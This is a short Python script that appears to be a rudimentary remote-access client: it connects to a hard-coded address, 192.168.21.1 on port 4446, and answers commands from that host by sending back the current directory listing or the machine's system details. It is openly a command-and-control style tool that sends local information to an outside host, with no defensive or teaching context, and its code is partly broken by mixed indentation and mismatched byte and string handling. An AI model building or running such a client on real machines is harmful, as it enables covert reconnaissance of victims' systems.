import socket
import os
import platform

# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect the socket to the port where the server is listening
server_address = ('192.168.21.1', 4446)
print('connecting to {} port {}'.format(*server_address))
sock.connect(server_address)
try:

    # Send data
    message = b'Connection successfull............'
    print('sending {!r}'.format(message))
    sock.sendall(message)	
    while True:
            data = sock.recv(1024)
            if data == "1":
		    path = os.getcwd()
		    directories = os.listdir(path)
		    for i in directories:
				message = i
				sock.sendall(message + "\n")
		    data = ""
            elif data == "2":
                    os_info = platform.uname()
		    for i in os_info:
			message = i
		        sock.sendall(message)
		    data = ""
	    else:
		    print("invalid data")
		    message = "Invalid data"
		    sock.sendall(message)

finally:
    print('closing socket')
    sock.close()
